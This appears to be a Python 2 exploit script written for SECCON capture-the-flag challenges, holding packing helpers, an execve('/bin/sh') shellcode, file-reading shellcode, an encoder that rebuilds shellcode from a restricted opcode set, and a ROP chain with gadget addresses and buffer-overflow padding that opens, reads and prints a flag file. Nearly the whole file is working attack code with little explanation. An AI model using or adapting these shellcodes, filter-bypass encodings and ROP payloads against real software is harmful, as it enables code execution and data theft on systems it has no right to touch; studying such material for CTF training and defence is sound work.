
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop


def holy_shellcode():
    '''
    Get the keyword.txt from hebrew.pwn.seccon.jp:10016.
    cat holy | nc hebrew.pwn.seccon.jp 10016
    '''
    a=1

def test_shellcode():
    opcode_expect_05 = range(0x91,0xbe)+\
                    range(0xbe,0xc7)+\
                    range(0xd0,0xEb)+[0xf0,0xf1,0xf3,0xf4]

    opcode_expect_fb =  range(0x1f,0x29)+\
                        range(0x2a,0x37)+\
                        range(0x38,0x3d)+[0x3e,0x40]


    def print_test(a, b):
        for i in range(len(opcode_expect_05)):
            print hex(opcode_expect_05[i]),
            print '05'
        for i in range(len(opcode_expect_fb)):
            print hex(opcode_expect_fb[i]),
            print 'fb'

    def add_al(value):
        #rep add	eax, 0x90909090
        if value in opcode_expect_05:
            mov_al = '\xf3\x05'+chr(value)+'\x05'+'\x2c\xfb'  
        elif value in opcode_expect_fb:
            mov_al = '\xf3\x05'+chr(value)+'\xfb'+'\x2c\xfb'  

        else:
            print 'Error add_al='+chr(value)
            exit()
        return mov_al

    sub_al_5 = '\x2c\xfb'       # sub	al, -5
    # flag = 1
    # flag = 2
    mov_al_0 = '\xb0\x05'+\
                add_al(0xf1)+\
                sub_al_5*2

    store_edi = '\xaa\x05'+sub_al_5*2

    pure_shell = '\x31\xD2\x31\xF6\x31\xFF\x31\xC0\x31\xC9\xB0\x0B\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x51\x89\xE2\x53\x89\xE1\xCD\x80'

    read_file =   "\x31\xc9\xf7\xe1\xb0\x05\x51" \
              "\x68"+"txt\x00" \
              "\x68"+"ord." \
              "\x68"+"keyw" \
              "\x89\xe3\xcd\x80\x93\x91\xb0\x03"+\
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"+\
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"+\
              "\x80"
    def aaaa(value_al):
        opcode_expect_05_1 = [0xbe,0xc0, 0xc3,0xc6]+\
                    range(0xd0,0xeb)+[0xf0,0xf1,0xf3,0xf4]
        all2= opcode_expect_fb + opcode_expect_05_1
        len_all = len(all2)
        for i in range(0,len_all):
            temp = (value_al - all2[i])&0xFF
            if (temp in opcode_expect_fb or temp in opcode_expect_05_1) and \
                (i in opcode_expect_fb or i in opcode_expect_05_1):
                ok = False
                break

    def gen_al(value_al):
        alll = opcode_expect_fb + opcode_expect_05
        opcode_expect_05_1 = [0xbe,0xc0, 0xc3]+\
                    range(0xd0,0xeb)+[0xf0,0xf1,0xf3,0xf4]
        all2= opcode_expect_fb + opcode_expect_05_1
        opcode = ''
        ok = True
        if value_al in all2:
            opcode += mov_al_0
            opcode += add_al(value_al)
        else:
            len_all = len(all2)
            for j in xrange(3):
                for i in range(0,len_all):
                    t_value_al = (value_al + 0xd0*j)&0xFF
                    temp = (t_value_al - all2[i])&0xFF
                    if temp in all2:
                        ok = False
                        break
                if ok == False:
                    break
            if ok == True:
                print 'can not seperate ',
                print value_al
            else:
                print hex(value_al),
                print '= ',
                print hex(temp),
                print hex(all2[i]),
                print str(j)+'*0x30'
            opcode += mov_al_0      # ngon
            for i in range(j):
                opcode += add_al(0x30)
            opcode += add_al(temp)
            opcode += add_al(all2[i])

        return opcode

    count = 0
    first = '\x97\x05' + '\x31\xfb'*2   # xchg	eax, edi
                                        # add	eax, 0xfb31fb31

    opcode_main = ''
    
    for i in read_file:
        print 'byte = '+str(count) + ' '
        t = ord(i)
        opcode_main += gen_al(t)
        opcode_main += store_edi    # flag = 1
        opcode_main += sub_al_5     # flag = 0
        count+=1
    aa = '\x9d\x05' + '\x31\xfb'*2  # 9d05909090909090
                                    # 0x0:	popfd	
                                    # 0x1:	add	eax, 0x90909090
    aa = aa*2
    aa += '\xc3\x05'                # ret
    #print opcode_main
    #print len(opcode_main)
    # 35fb20fbf005 
    # 080491A0 ^fb20fb^fb27fb080498A0
    '''
    bb0520fbf00531fb31fb
    0x0:	mov	ebx, 0xf0fb2005
    33fb
    0x0:	xor	edi, ebx
    bb0528fbf00531fb31fb
    0x0:	mov	ebx, 0xf0fb2705
    33fb
    0x0:	xor	edi, ebx
    '''
    # add edi, 0x700
    add_edi_700 = 'bb0523fbf00531fb31fb33fb'.decode('hex')+'bb052afbf00531fb31fb33fb'.decode('hex')
    aaa = first+add_edi_700+opcode_main
    aaa = aaa + ((0x700-len(aaa))/2)*sub_al_5+'\n'
    print len(aaa)
    print hex(len(aaa))
    write_file('a',aaa)
#test_shellcode()

def arm_exploit():
    '''
    Advanced RISC Machine
    Running this program on port 10001.
    '''

    '''

    '''

def rop_impossible():
    '''
    ropi.pwn.seccon.jp:10000
    open("/flag", 0);
    read(3, buf, 32);
    write(1, buf, 32);
    '''

    flag_string_address = 0x080CB960+0x20
    temp_address = 0x080CB960+0x1000

    #########
    # stage 1

    # 0x08079860: pop edx ; pop ecx ; pop eax ; jmp  [eax] ;
    pop_jmp = 0x08079860
    # 0x080481c6: sub esp, 0x18 ; mov  [esp+0x04], eax ; mov  [esp], 0x080C9FC0 ; call edx ;  (1 found)
    #sub_esp = 0x080481c6
    sub_esp = 0x080481d4 #0x080481c6
    # 0x08094c7c: call  [ecx] ;
    call_pointer_ecx = 0x08094c7c

    #0x0805fd14: call ecx ;  (14 found)
    #0x080481d4: call edx ;  (23 found)

    # + set up edx ecx
    # + call edx => call ecx => jmp [eax] => call edx ...

    junk = 0x41414141
    aaa = flag_string_address  # [aaa] <= sub_esp
    aaaa = flag_string_address+4      # <= pop_jmp = 0x08079860
    main_address = flag_string_address+8 # [main_address] <= 0x08048254
    aaaaa = flag_string_address+0x0c
    open_address = 0x080516A0
    write_address = 0x080517B0
    read_address = 0x08051750
    pop2 = 0x080488c3
    pop3 = 0x0804987e
    rop1 = [
        open_address,
        pop2,
        0x080CB960,
        0,

        read_address,
        pop3,
        3,
        temp_address,               # dia chi luu tam flag
        32,
        junk,

        write_address,
        pop3,
        3,
        temp_address,
        32,
        junk
    ]
    rop1 = convert_format(rop1)

    sent = 'a'*0x20+pi(sub_esp)+pi(pop_jmp)+pi(main_address)+pi(call_pointer_ecx)
    sent = sent+(0x100-len(sent))*'a'+pi(0x08048260)+pi(0x08048260)+'bbbb'+'cccc'*2+rop1+'1111'

    sent1 = './flag\x00'+'d'*(0x20-len('./flag\x00'))+pi(sub_esp)+pi(pop_jmp)+pi(main_address)+pi(call_pointer_ecx)
    sent1 = sent1+(0x100-len(sent1))*'d'+pi(0x08048254)+pi(0x08048254)*4+rop1+'2222'

    ww=''
    for i in xrange(30):
        ww += sent+'y'*(0x1FF-len(sent))+'\n'

    ww += sent1+'X'*(0x1FF-len(sent1))+'\n'

    print ww

    def rop3():
        a=1
rop_impossible()